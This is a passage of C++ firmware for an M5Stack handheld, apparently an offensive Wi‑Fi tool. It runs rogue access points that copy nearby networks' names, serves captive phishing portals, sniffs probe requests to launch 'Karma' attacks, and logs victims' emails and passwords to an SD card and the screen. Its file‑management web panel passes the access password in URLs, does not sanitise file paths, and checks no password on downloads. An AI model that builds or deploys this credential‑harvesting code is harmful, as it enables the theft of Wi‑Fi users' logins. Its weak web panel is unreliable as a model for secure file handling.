    sendMessage("Portal " + ssid + " Deployed with " + selectedPortalFile.substring(7) + " Portal !");
    sendMessage("-------------------");
#if LED_ENABLED
    led.pattern3();
#endif
    if (!isProbeKarmaAttackMode && !isAutoKarmaActive) {
        ui.waitAndReturnToMenu("Portal\n" + ssid + "\nDeployed");
    }
}


String getDirectoryHtml(File dir, String path, String password) {
    String html = "<!DOCTYPE html><html><head><style>";
    html += "body{font-family:sans-serif;background:#f0f0f0;padding:20px}";
    html += "ul{list-style-type:none;padding:0}";
    html += "li{margin:10px 0;padding:5px;background:white;border:1px solid #ddd;border-radius:5px}";
    html += "a{color:#007bff;text-decoration:none}";
    html += "a:hover{color:#0056b3}";
    html += ".red{color:red}";
    html += "</style></head><body><ul>";
    if (path != "/") {
        String parentPath = path.substring(0, path.lastIndexOf('/'));
        if (parentPath == "") parentPath = "/";
        html += "<li><a href='/check-sd-file?dir=" + parentPath + "&pass=" + password + "'>[Up]</a></li>";
    }

    while (File file = dir.openNextFile()) {
        String fileName = String(file.name());
        String displayFileName = fileName;
        if (path != "/" && fileName.startsWith(path)) {
            displayFileName = fileName.substring(path.length());
            if (displayFileName.startsWith("/")) {
                displayFileName = displayFileName.substring(1);
            }
        }

        String fullPath = path + (path.endsWith("/") ? "" : "/") + displayFileName;
        if (!fullPath.startsWith("/")) {
            fullPath = "/" + fullPath;
        }

        if (file.isDirectory()) {
            html += "<li>Directory: <a href='/check-sd-file?dir=" + fullPath + "&pass=" + password + "'>" + displayFileName + "</a></li>";
        } else {
            html += "<li>File: <a href='/download-sd-file?filename=" + fullPath + "&pass=" + password + "'>" + displayFileName + "</a> (" + String(file.size()) + " bytes) <a href='#' onclick='confirmDelete(\"" + fullPath + "\")' style='color:red;'>Delete</a></li>";
        }
        file.close();
    }
    html += "</ul>";

    html += "<script>"
            "function confirmDelete(filename) {"
            "  if (confirm('Are you sure you want to delete ' + filename + '?')) {"
            "    window.location.href = '/delete-sd-file?filename=' + filename + '&pass=" + password + "';"
            "  }"
            "}"
            "window.onload = function() {const urlParams = new URLSearchParams(window.location.search);if (urlParams.has('refresh')) {urlParams.delete('refresh');history.pushState(null, '', location.pathname + '?' + urlParams.toString());window.location.reload();}};"
            "</script>";

    return html;
}


void handleSdCardBrowse() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
        server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
        return;
    }

    String dirPath = server.arg("dir");
    if (dirPath == "") dirPath = "/";

    File dir = openFile(dirPath, FILE_READ);
    if (!dir || !dir.isDirectory()) {
        server.send(404, "text/html", "<html><body><p>Directory not found.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
        return;
    }


    String html = "<p><a href='/evil-m5core2-menu'><button style='background-color: #007bff; border: none; color: white; padding: 6px 15px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer;'>Menu</button></a></p>";
    html += getDirectoryHtml(dir, dirPath, accessWebPassword);
    server.send(200, "text/html", html);
    dir.close();
}

void handleFileDownload() {
    String fileName = server.arg("filename");
    if (!fileName.startsWith("/")) {
        fileName = "/" + fileName;
    }
    if (SD.exists(fileName)) {
        File file = SD.open(fileName, FILE_READ);
        if (file) {
            String downloadName = fileName.substring(fileName.lastIndexOf('/') + 1);
            server.sendHeader("Content-Disposition", "attachment; filename=" + downloadName);
            server.streamFile(file, "application/octet-stream");
            file.close();
            return;
        }
    }
    server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
}


void handleFileUpload() {
    HTTPUpload& upload = server.upload();
    String password = server.arg("pass");
    const size_t MAX_UPLOAD_SIZE = 8192;

    if (password != accessWebPassword) {
        sendMessage("Unauthorized access attempt");
        server.send(403, "text/html", "<html><body><p>Unauthorized</p></body></html>");
        return;
    }

    if (upload.status == UPLOAD_FILE_START) {
        String filename = upload.filename;
        String directory = server.arg("directory");

        if (!directory.startsWith("/")) {
            directory = "/" + directory;
        }

        if (!directory.endsWith("/")) {
            directory += "/";
        }

        String fullPath = directory + filename;

        fsUploadFile = SD.open(fullPath, FILE_WRITE);
        if (!fsUploadFile) {
            sendMessage("Upload start failed: Unable to open file " + fullPath);
            server.send(500, "text/html", "File opening failed");
            return;
        }

        sendMessage("Upload Start: ");
        sendMessage(fullPath);
    } else if (upload.status == UPLOAD_FILE_WRITE) {
        if (fsUploadFile && upload.currentSize > 0 && upload.currentSize <= MAX_UPLOAD_SIZE) {
            size_t written = fsUploadFile.write(upload.buf, upload.currentSize);
            if (written != upload.currentSize) {
                sendMessage("Write Error: Inconsistent data size.");
                fsUploadFile.close();
                server.send(500, "text/html", "File write error");
                return;
            }
        } else {
            if (!fsUploadFile) {
                sendMessage("Error: File is no longer valid for writing.");
            } else if (upload.currentSize > MAX_UPLOAD_SIZE) {
                sendMessage("Error: Data segment size too large.");
                sendMessage(String(upload.currentSize));
            } else {
                sendMessage("Information: Empty data segment received.");
            }
            return;
        }
    } else if (upload.status == UPLOAD_FILE_END) {
        if (fsUploadFile) {
            fsUploadFile.close();
            sendMessage("Upload End: " + String(upload.totalSize));
            server.send(200, "text/html", "<html><body><p>File successfully uploaded</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
            sendMessage("File successfully uploaded");
        } else {
            server.send(500, "text/html", "File closing error");
            sendMessage("File closing error");
        }
    }
}

void handleListDirectories() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
        server.send(403, "text/plain", "Unauthorized");
        return;
    }

    File root = SD.open("/");
    String dirList = "";

    while (File file = root.openNextFile()) {
        if (file.isDirectory()) {
            dirList += String(file.name()) + "\n";
        }
        file.close();
    }
    root.close();
    server.send(200, "text/plain", dirList);
}

void listDirectories(File dir, String path, String &output) {
    while (File file = dir.openNextFile()) {
        if (file.isDirectory()) {
            output += String(file.name()) + "\n";
            listDirectories(file, String(file.name()), output);
        }
        file.close();
    }
}


void handleFileDelete() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
        server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
        return;
    }

    String fileName = server.arg("filename");
    if (!fileName.startsWith("/")) {
        fileName = "/" + fileName;
    }
    if (SD.exists(fileName)) {
        if (SD.remove(fileName)) {
            server.send(200, "text/html", "<html><body><p>File deleted successfully</p><script>setTimeout(function(){window.location = document.referrer + '&refresh=true';}, 2000);</script></body></html>");
            sendMessage("-------------------");
            sendMessage("File deleted successfully");
            sendMessage("-------------------");
        } else {
            server.send(500, "text/html", "<html><body><p>File could not be deleted</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
            sendMessage("-------------------");
            sendMessage("File could not be deleted");
            sendMessage("-------------------");
        }
    } else {
        server.send(404, "text/html", "<html><body><p>File not found</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
        sendMessage("-------------------");
        sendMessage("File not found");
        sendMessage("-------------------");
    }
}

void servePortalFile(const String& filename) {
    File webFile = openFile(filename, FILE_READ);
    if (webFile) {
        server.streamFile(webFile, "text/html");
        /*sendMessage("-------------------");
        sendMessage("serve portal.");
        sendMessage("-------------------");*/
        webFile.close();
    } else {
        server.send(404, "text/html", "<html><body><p>File not found</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
    }
}


void saveCredentials(const String& email, const String& password, const String& portalName, const String& clonedSSID) {
    File file = openFile("/credentials.txt", FILE_APPEND);
    if (file) {
        file.println("-- Email -- \n" + email);
        file.println("-- Password -- \n" + password);
        file.println("-- Portal -- \n" + portalName); // Ajout du nom du portail
        file.println("-- SSID -- \n" + clonedSSID); // Ajout du SSID cloné
        file.println("----------------------");
        file.close();
        sendMessage("-------------------");
        sendMessage(" !!! Credentials " + email + ":" + password + " saved !!! ");
        sendMessage("On Portal Name: " + portalName);
        sendMessage("With Cloned SSID: " + clonedSSID);
        sendMessage("-------------------");
    } else {
        sendMessage("Error opening file for writing");
    }
}


void stopCaptivePortal(CallbackMenuItem& menuItem) {
    dnsServer.stop();
    server.stop();
    WiFi.mode(WIFI_MODE_APSTA);
    WiFi.softAPdisconnect(true);
    isCaptivePortalOn = false;
    sendMessage("-------------------");
    sendMessage("Portal Stopped");
    sendMessage("-------------------");
#if LED_ENABLED
    led.pattern4();
#endif
    ui.waitAndReturnToMenu("Portal Stopped");
}

void serveChangePasswordPage() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
        server.send(403, "text/html", "<html><body><p>Unauthorized</p></body></html>");
        return;
    }

    String html = "<html><head><style>";
    html += "body { background-color: #333; color: white; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }";
    html += "form { background-color: #444; padding: 20px; border-radius: 8px; display: inline-block; }";
    html += "input[type='password'], input[type='submit'] { width: 80%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }";
    html += "input[type='submit'] { background-color: #008CBA; color: white; cursor: pointer; }";
    html += "input[type='submit']:hover { background-color: #005F73; }";
    html += "</style></head><body>";
    html += "<form action='/Change-Portal-Password-demand' method='get'>";
    html += "<input type='hidden' name='pass' value='" + password + "'>";
    html += "<h2>Change Portal Password</h2>";
    html += "New Password: <br><input type='password' name='newPassword'><br>";
    html += "<input type='submit' value='Change Password'>";
    html += "</form><br>Leave empty for an open AP.<br>Remember to deploy the portal again after changing the password.<br></body></html>";
    server.send(200, "text/html", html);
}


void handleChangePassword() {
    server.on("/Change-Portal-Password-demand", HTTP_GET, []() {
        String password = server.arg("pass");
        if (password != accessWebPassword) {
            server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
            return;
        }

        String newPassword = server.arg("newPassword");
        captivePortalPassword = newPassword;
        server.send(200, "text/html", "<html><body><p>Password Changed Successfully !!</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
    });

    serveChangePasswordPage();
}


String credentialsList[100]; // max 100 lignes parsed
int numCredentials = 0;

void readCredentialsFromFile() {
    File file = openFile("/credentials.txt", FILE_READ);

    if (file) {
        numCredentials = 0;
        while (file.available() && numCredentials < 100) {
            credentialsList[numCredentials++] = file.readStringUntil('\n');
        }
        file.close();
    } else {
        sendMessage("Error opening file");
    }
}

void checkCredentials(CallbackMenuItem& menuItem) {
    readCredentialsFromFile(); // Assume this populates a global array or vector with credentials

    // Initial display setup
    int currentListIndex = 0;
    bool needDisplayUpdate = true;

    while (true) {
        if (needDisplayUpdate) {
            displayCredentials(currentListIndex); // Function to display credentials on the screen
            needDisplayUpdate = false;
        }

        M5.update();
        handleDnsRequestSerial(); // Handle any background tasks

        // Navigation logic
        if (M5.BtnA.wasPressed()) {
            currentListIndex = max(0, currentListIndex - 1);
            needDisplayUpdate = true;
        } else if (M5.BtnC.wasPressed()) {
            currentListIndex = min(numCredentials - 1, currentListIndex + 1);
            needDisplayUpdate = true;
        } else if (M5.BtnB.wasPressed()) {
            // Exit or perform an action with the selected credential
            break; // Exit the loop to return to the menu or do something with the selected credential
        }
    }

    // Return to menu or next operation
    //ui.setInMenu(true); // Assuming this flag controls whether you're in the main menu
}

void displayCredentials(int index) {
    // Clear the display and set up text properties
    M5.Display.clear();
    M5.Display.setTextSize(2);

    int maxVisibleLines = M5.Display.height() / 18; // Nombre maximum de lignes affichables à l'écran
    int currentLine = 0; // Ligne actuelle en cours de traitement
    int firstLineIndex = index; // Index de la première ligne de l'entrée sélectionnée
    int linesBeforeIndex = 0; // Nombre de lignes avant l'index sélectionné

    // Calculer combien de lignes sont nécessaires avant l'index sélectionné
    for (int i = 0; i < index; i++) {
        int neededLines = 1 + M5.Display.textWidth(credentialsList[i]) / (M5.Display.width() - 20);
        linesBeforeIndex += neededLines;
    }

    // Ajuster l'index de la première ligne si nécessaire pour s'assurer que l'entrée sélectionnée est visible
    while (linesBeforeIndex > 0 && linesBeforeIndex + maxVisibleLines - 1 < index) {
        linesBeforeIndex--;
        firstLineIndex--;
    }

    // Afficher les entrées de credentials visibles
    for (int i = firstLineIndex; currentLine < maxVisibleLines && i < numCredentials; i++) {
        String credential = credentialsList[i];
        int neededLines = 1 + M5.Display.textWidth(credential) / (M5.Display.width() - 20);

        if (i == index) {
            M5.Display.fillRect(0, currentLine * 18, M5.Display.width(), 18 * neededLines, TFT_NAVY);
        }

        for (int line = 0; line < neededLines; line++) {
            M5.Display.setCursor(10, (currentLine + line) * 18);
            M5.Display.setTextColor(i == index ? TFT_GREEN : TFT_WHITE);

            int startChar = line * (credential.length() / neededLines);
            int endChar = min(credential.length(), startChar + (credential.length() / neededLines));
            M5.Display.println(credential.substring(startChar, endChar));
        }

        currentLine += neededLines;
    }

    M5.Display.display();
}


void probeSniffing() {
    isProbeSniffingMode = true;
    isProbeSniffingRunning = true;
    startScanKarma();

    while (isProbeSniffingRunning) {
        M5.update();
        handleDnsRequestSerial();

        if (M5.BtnB.wasPressed()) {
            stopProbeSniffingViaSerial = false;
            isProbeSniffingRunning = false;
            break;
        }
    }

    stopScanKarma();
    isProbeSniffingMode = false;
    if (stopProbeSniffingViaSerial) {
        stopProbeSniffingViaSerial = false;
    }
}


void karmaAttack() {
    drawStartButtonKarma();
}


//KARMA-PART-FUNCTIONS

void packetSnifferKarma(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!isScanningKarma || type != WIFI_PKT_MGMT) return;

    const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t *frame = packet->payload;
    const uint8_t frame_type = frame[0];

    if (ssid_count_Karma == 0) {
        ui.writeSingleMessage("Waiting for probe...", false);
    }

    if (frame_type == 0x40) { // Probe Request Frame
        uint8_t ssid_length_Karma = frame[25];
        if (ssid_length_Karma >= 1 && ssid_length_Karma <= 32) {
            char ssidKarma[33] = {0};
            memcpy(ssidKarma, &frame[26], ssid_length_Karma);
            ssidKarma[ssid_length_Karma] = '\0';
            if (strlen(ssidKarma) == 0 || strspn(ssidKarma, " ") == strlen(ssidKarma)) {
                return;
            }

            bool ssidExistsKarma = false;
            for (int i = 0; i < ssid_count_Karma; i++) {
                if (strcmp(ssidsKarma[i], ssidKarma) == 0) {
                    ssidExistsKarma = true;
                    break;
                }
            }


            if (config.isSSIDWhitelisted(ssidKarma)) {
                if (seenWhitelistedSSIDs.find(ssidKarma) == seenWhitelistedSSIDs.end()) {
                    seenWhitelistedSSIDs.insert(ssidKarma);
                    sendMessage("SSID in whitelist, ignoring: " + String(ssidKarma));
                }
                return;
            }

            if (!ssidExistsKarma && ssid_count_Karma < MAX_SSIDS_Karma) {
                strcpy(ssidsKarma[ssid_count_Karma], ssidKarma);
                updateDisplayWithSSIDKarma(ssidKarma, ++ssid_count_Karma);
                sendMessage("Found: " + String(ssidKarma));
#if LED_ENABLED
                led.pattern5();
#endif
            }
        }
    }
}

void saveSSIDToFile(const char* ssid) {
    bool ssidExists = false;
    File readfile = openFile("/probes.txt", FILE_READ);

    if (readfile) {
        while (readfile.available()) {
            String line = readfile.readStringUntil('\n');
            if (line.equals(ssid)) {
                ssidExists = true;
                break;
            }
        }
        readfile.close();
    }
    if (!ssidExists) {
        File file = openFile("/probes.txt", FILE_APPEND);
        if (file) {
            file.println(ssid);
            file.close();
        } else {
            sendMessage("Error opening probes.txt");
        }
    }
}


void updateDisplayWithSSIDKarma(const char* ssidKarma, int count) {
    const int maxLength = 22;
    char truncatedSSID[23];

    M5.Display.fillRect(0, 0, M5.Display.width(), M5.Display.height() - 60, TFT_BLACK);
    int startIndexKarma = max(0, count - maxMenuDisplayKarma);

    for (int i = startIndexKarma; i < count; i++) {
        int lineIndexKarma = i - startIndexKarma;
        M5.Display.setCursor(0, lineIndexKarma * 20);

        if (strlen(ssidsKarma[i]) > maxLength) {
            strncpy(truncatedSSID, ssidsKarma[i], maxLength);
            truncatedSSID[maxLength] = '\0';
            M5.Display.printf("%d.%s", i + 1, truncatedSSID);
        } else {
            M5.Display.printf("%d.%s", i + 1, ssidsKarma[i]);
        }
    }
    if ( count <= 9) {
        M5.Display.fillRect(M5.Display.width() - 15, 0, 15, 20, TFT_DARKGREEN);
        M5.Display.setCursor(M5.Display.width() - 13, 3);
    } else if ( count >= 10 && count <= 99){
        M5.Display.fillRect(M5.Display.width() - 30, 0, 30, 20, TFT_DARKGREEN);
        M5.Display.setCursor(M5.Display.width() - 27, 3);
    } else if ( count >= 100 && count < MAX_SSIDS_Karma*0.7){
        M5.Display.fillRect(M5.Display.width() - 45, 0, 45, 20, TFT_ORANGE);
        M5.Display.setTextColor(TFT_BLACK);
        M5.Display.setCursor(M5.Display.width() - 42, 3);
        M5.Display.setTextColor(TFT_WHITE);
    } else {
        M5.Display.fillRect(M5.Display.width() - 45, 0, 45, 20, TFT_RED);
        M5.Display.setCursor(M5.Display.width() - 42, 3);
    }
    if (count == MAX_SSIDS_Karma){
        M5.Display.printf("MAX");
    } else {
        M5.Display.printf("%d", count);
    }
    M5.Display.display();
}


void drawStartButtonKarma() {
    M5.Display.clear();
    M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_GREEN);
    M5.Display.setCursor(100, M5.Display.height() - 40);
    M5.Display.setTextColor(TFT_BLACK);
    M5.Display.println("Start Sniff");
    M5.Display.setTextColor(TFT_WHITE);
}

void drawStopButtonKarma() {
    M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
    M5.Display.setCursor(100, M5.Display.height() - 40);
    M5.Display.println("Stop Sniff");
    M5.Display.setTextColor(TFT_WHITE);
}

void startScanKarma() {
    isScanningKarma = true;
    ssid_count_Karma = 0;
    M5.Display.clear();
    drawStopButtonKarma();
    bluetoothEnabled = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_deinit();
    delay(300); //petite pause
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&packetSnifferKarma);

    config.readConfigFile();
    seenWhitelistedSSIDs.clear();

    sendMessage("-------------------");
    sendMessage("Probe Sniffing Started...");
    sendMessage("-------------------");
}


void stopScanKarma() {
    sendMessage("-------------------");
    sendMessage("Sniff Stopped. SSIDs found: " + String(ssid_count_Karma));
    sendMessage("-------------------");
    isScanningKarma = false;
    esp_wifi_set_promiscuous(false);


    if (stopProbeSniffingViaSerial && ssid_count_Karma > 0) {
        sendMessage("Saving SSIDs to SD card automatically...");
        for (int i = 0; i < ssid_count_Karma; i++) {
            saveSSIDToFile(ssidsKarma[i]);
        }
        sendMessage(String(ssid_count_Karma) + " SSIDs saved on SD.");
    } else if (isProbeSniffingMode && ssid_count_Karma > 0) {
        bool saveSSID = ui.confirmPopup("   Save " + String(ssid_count_Karma) + " SSIDs?", true);
        if (saveSSID) {
            M5.Display.clear();
            M5.Display.setCursor(50 , M5.Display.height()/ 2 );
            M5.Display.println("Saving SSIDs on SD..");
            for (int i = 0; i < ssid_count_Karma; i++) {
                saveSSIDToFile(ssidsKarma[i]);
            }
            M5.Display.clear();
            M5.Display.setCursor(50 , M5.Display.height()/ 2 );
            M5.Display.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
            sendMessage("-------------------");
            sendMessage(String(ssid_count_Karma) + " SSIDs saved on SD.");
            sendMessage("-------------------");
        } else {
            M5.Display.clear();
            M5.Display.setCursor(50 , M5.Display.height()/ 2 );
            M5.Display.println("  No SSID saved.");
        }
        delay(1000);
    memset(ssidsKarma, 0, sizeof(ssidsKarma));
    ssid_count_Karma = 0;
    }


    menuSizeKarma = ssid_count_Karma;
    currentIndexKarma = 0;
    menuStartIndexKarma = 0;

    if (isKarmaMode && ssid_count_Karma > 0) {
        drawMenuKarma();
        currentStateKarma = StopScanKarma;
    } else {
        currentStateKarma = StartScanKarma;
        //ui.setInMenu(true);
    }
    isKarmaMode = false;
    isProbeSniffingMode = false;
    stopProbeSniffingViaSerial = false;
}


void handleMenuInputKarma() {
    bool stateChanged = false;

    if (M5.BtnA.wasPressed()) {
        currentIndexKarma--;
        if (currentIndexKarma < 0) {
            currentIndexKarma = menuSizeKarma - 1;
        }
        stateChanged = true;
    } else if (M5.BtnC.wasPressed()) {
        currentIndexKarma++;
        if (currentIndexKarma >= menuSizeKarma) {
            currentIndexKarma = 0;
        }
        stateChanged = true;
    }

    if (stateChanged) {
        menuStartIndexKarma = max(0, min(currentIndexKarma, menuSizeKarma - maxMenuDisplayKarma));
    }

    if (M5.BtnB.wasPressed()) {
        executeMenuItemKarma(currentIndexKarma);
        stateChanged = true;
    }
    if (stateChanged) {
        drawMenuKarma();
    }
}


void drawMenuKarma() {
    M5.Display.clear();
    M5.Display.setTextSize(2);
    M5.Display.setTextFont(1);

    int lineHeight = 24;
    int startX = 10;
    int startY = 25;

    for (int i = 0; i < maxMenuDisplayKarma; i++) {
        int menuIndexKarma = menuStartIndexKarma + i;
        if (menuIndexKarma >= menuSizeKarma) break;

        if (menuIndexKarma == currentIndexKarma) {
            M5.Display.fillRect(0, startY + i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
            M5.Display.setTextColor(TFT_GREEN);
        } else {
            M5.Display.setTextColor(TFT_WHITE);
        }
        M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 8);
        M5.Display.println(ssidsKarma[menuIndexKarma]);
    }
    M5.Display.display();
}

void executeMenuItemKarma(int indexKarma) {
    if (indexKarma >= 0 && indexKarma < ssid_count_Karma) {
        startAPWithSSIDKarma(ssidsKarma[indexKarma]);
    } else {
        M5.Display.clear();
        M5.Display.println("Selection invalide!");
        delay(1000);
        drawStartButtonKarma();
        currentStateKarma = StartScanKarma;
    }
}

void startAPWithSSIDKarma(const char* ssid) {
    currentClonedSSID = ssid;
    isProbeKarmaAttackMode = true;
    config.readConfigFile();
    //createCaptivePortal();

    sendMessage("-------------------");
    sendMessage("Karma Attack started for: " + String(ssid));
    sendMessage("-------------------");

    M5.Display.clear();
    unsigned long startTime = millis();
    unsigned long currentTime;
    int remainingTime;
    int clientCount = 0;
    int scanTimeKarma = 60; // Scan time for karma attack (not for Karma Auto)

    while (true) {
        M5.update();
        handleDnsRequestSerial();
        currentTime = millis();
        remainingTime = scanTimeKarma - ((currentTime - startTime) / 1000);
        clientCount = WiFi.softAPgetStationNum();

        M5.Display.setCursor((M5.Display.width() - 12 * strlen(ssid)) / 2, 50);
        M5.Display.println(String(ssid));

        int textWidth = 12 * 16;
        M5.Display.fillRect((M5.Display.width() - textWidth) / 2, 90, textWidth, 20, TFT_BLACK);
        M5.Display.setCursor((M5.Display.width() - textWidth) / 2, 90);
        M5.Display.print("Left Time: ");
        M5.Display.print(remainingTime);
        M5.Display.println(" s");

        textWidth = 12 * 20;
        M5.Display.fillRect((M5.Display.width() - textWidth) / 2, 130, textWidth, 20, TFT_BLACK);
        M5.Display.setCursor((M5.Display.width() - textWidth) / 2, 130);
        M5.Display.print("Connected Client: ");
        M5.Display.println(clientCount);

        sendMessage("---Karma-Attack---");
        sendMessage("On :" + String(ssid));
        sendMessage("Left Time: " + String(remainingTime) + "s");
        sendMessage("Connected Client: "+ String(clientCount));
        sendMessage("-------------------");


        M5.Display.setCursor(130, 220);
        M5.Display.println(" Stop");
        M5.Display.display();

        if (remainingTime <= 0) {
            break;
        }
        if (M5.BtnB.wasPressed()) {
            break;
        } else {
            delay(200);
        }
    }

    if (clientCount > 0) {
        ui.writeSingleMessage("Karma Successful!!!", true);
        sendMessage("-------------------");
        sendMessage("Karma Attack worked !");
        sendMessage("-------------------");
    } else {
        ui.writeSingleMessage(" Karma Failed...", true);
        sendMessage("-------------------");
        sendMessage("Karma Attack failed...");
        sendMessage("-------------------");
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_STA);
    }
    delay(2000);
    if (ui.confirmPopup("Save " + String(ssid) + " ?" , true)) {
        saveSSIDToFile(ssid);
    }
    //ui.setInMenu(true);
    isProbeKarmaAttackMode = false;
    currentStateKarma = StartScanKarma;
    memset(ssidsKarma, 0, sizeof(ssidsKarma));
    ssid_count_Karma = 0;
}

void listProbes() {
    File file = openFile("/probes.txt", FILE_READ);
    if (!file) {
        ui.waitAndReturnToMenu("Failed to open probes.txt");
        return;
    }

    String probes[MAX_SSIDS_Karma];
    int numProbes = 0;

    while (file.available() && numProbes < MAX_SSIDS_Karma) {
        String line = file.readStringUntil('\n');
        line.trim();
        if (line.length() > 0 && !isProbePresent(probes, numProbes, line)) {
            probes[numProbes++] = line;

        }
    }
    file.close();
    if (numProbes == 0) {
        sendMessage("-------------------");
        sendMessage(" No probes found");
        sendMessage("-------------------");
        ui.waitAndReturnToMenu(" No probes found");
        return;
    }

    const int maxDisplay = 11;
    const int maxSSIDLength = 23; // Adjust based on your display width
    int currentListIndex = 0;
    int listStartIndex = 0;
    int selectedIndex = -1;
    bool needDisplayUpdate = true;

    while (selectedIndex == -1) {
        M5.update();
        handleDnsRequestSerial();
        bool indexChanged = false;
        if (M5.BtnA.wasPressed()) {
            currentListIndex--;
            if (currentListIndex < 0) currentListIndex = numProbes - 1;
            indexChanged = true;
        } else if (M5.BtnC.wasPressed()) {
            currentListIndex++;
            if (currentListIndex >= numProbes) currentListIndex = 0;
            indexChanged = true;
        } else if (M5.BtnB.wasPressed()) {
            selectedIndex = currentListIndex;
        }

        if (indexChanged) {
            listStartIndex = max(0, min(currentListIndex, numProbes - maxDisplay));
            needDisplayUpdate = true;
        }

        if (needDisplayUpdate) {
            M5.Display.clear();
            M5.Display.setTextSize(2);
            int y = 10;

            for (int i = 0; i < maxDisplay; i++) {
                int probeIndex = listStartIndex + i;
                if (probeIndex >= numProbes) break;

                String ssid = probes[probeIndex];
                if (ssid.length() > maxSSIDLength) {
                    ssid = ssid.substring(0, maxSSIDLength) + "..";
                }

                M5.Display.setCursor(10, y);
                M5.Display.setTextColor(probeIndex == currentListIndex ? TFT_GREEN : TFT_WHITE);
                M5.Display.println(ssid);
                y += 20;
            }

            M5.Display.display();
            needDisplayUpdate = false;
        }
    }
    currentClonedSSID = probes[selectedIndex];
    sendMessage("-------------------");
    sendMessage("SSID selected: " + currentClonedSSID);
    sendMessage("-------------------");
    ui.waitAndReturnToMenu(currentClonedSSID + " selected");
}


bool isProbePresent(String probes[], int numProbes, String probe) {
    for (int i = 0; i < numProbes; i++) {
        if (probes[i] == probe) {
            return true;
        }
    }
    return false;
}


void deleteProbe() {
    File file = openFile("/probes.txt", FILE_READ);
    if (!file) {
        ui.waitAndReturnToMenu("Failed to open probes.txt");
        return;
    }

    String probes[MAX_SSIDS_Karma];
    int numProbes = 0;

    while (file.available() && numProbes < MAX_SSIDS_Karma) {
        String line = file.readStringUntil('\n');
        line.trim();
        if (line.length() > 0) {
            probes[numProbes++] = line;
        }
    }
    file.close();

    if (numProbes == 0) {
        ui.waitAndReturnToMenu("No probes found");
        return;
    }

    const int maxSSIDLength = 23; // Adjust based on your display width
    const int maxDisplay = 11;
    int currentListIndex = 0;
    int listStartIndex = 0;
    int selectedIndex = -1;
    bool needDisplayUpdate = true;

    while (selectedIndex == -1) {
        M5.update();
        handleDnsRequestSerial();
        if (needDisplayUpdate) {
            M5.Display.clear();
            M5.Display.setTextSize(2);

            for (int i = 0; i < maxDisplay; i++) {
                int probeIndex = listStartIndex + i;
                if (probeIndex >= numProbes) break;

                String ssid = probes[probeIndex];
                if (ssid.length() > maxSSIDLength) {
                    ssid = ssid.substring(0, maxSSIDLength) + "..";
                }

                M5.Display.setCursor(10, i * 20 + 10);
                M5.Display.setTextColor(probeIndex == currentListIndex ? TFT_GREEN : TFT_WHITE);
                M5.Display.println(ssid);
            }

            M5.Display.display();
            needDisplayUpdate = false;
        }

        if (M5.BtnA.wasPressed()) {
            currentListIndex--;
            if (currentListIndex < 0) currentListIndex = numProbes - 1;
            needDisplayUpdate = true;
        } else if (M5.BtnC.wasPressed()) {
            currentListIndex++;
            if (currentListIndex >= numProbes) currentListIndex = 0;
            needDisplayUpdate = true;
        } else if (M5.BtnB.wasPressed()) {
            selectedIndex = currentListIndex;
        }

        listStartIndex = max(0, min(currentListIndex, numProbes - maxDisplay));
    }

    bool success = false;
    if (selectedIndex >= 0 && selectedIndex < numProbes) {
        String selectedProbe = probes[selectedIndex];
        if (ui.confirmPopup("Delete " + selectedProbe + " probe ?", true)) {
            success = removeProbeFromFile("/probes.txt", selectedProbe);
        }

        if (success) {
            sendMessage("-------------------");
            sendMessage(selectedProbe + " deleted");
            sendMessage("-------------------");
            ui.waitAndReturnToMenu(selectedProbe + " deleted");
        } else {
            ui.waitAndReturnToMenu("Error deleting probe");
        }
    } else {
        ui.waitAndReturnToMenu("No probe selected");
    }
}


int showProbesAndSelect(String probes[], int numProbes) {
    const int maxDisplay = 11; // Maximum number of items to display at once
    int currentListIndex = 0; // Index of the current item in the list
    int listStartIndex = 0; // Index of the first item to display
    bool needDisplayUpdate = true;
    int selectedIndex = -1; // -1 means no selection

    while (selectedIndex == -1) {
        M5.update();
        handleDnsRequestSerial();
        if (needDisplayUpdate) {
            M5.Display.clear();
            M5.Display.setTextSize(2);

            for (int i = 0; i < maxDisplay && (listStartIndex + i) < numProbes; i++) {
                M5.Display.setCursor(10, i * 20 + 10);
                M5.Display.setTextColor((listStartIndex + i) == currentListIndex ? TFT_GREEN : TFT_WHITE);
                M5.Display.println(probes[listStartIndex + i]);
            }
            M5.Display.display();
            needDisplayUpdate = false;
        }

        if (M5.BtnA.wasPressed()) {
            currentListIndex--;
            if (currentListIndex < 0) {
                currentListIndex = numProbes - 1;
            }
            needDisplayUpdate = true;
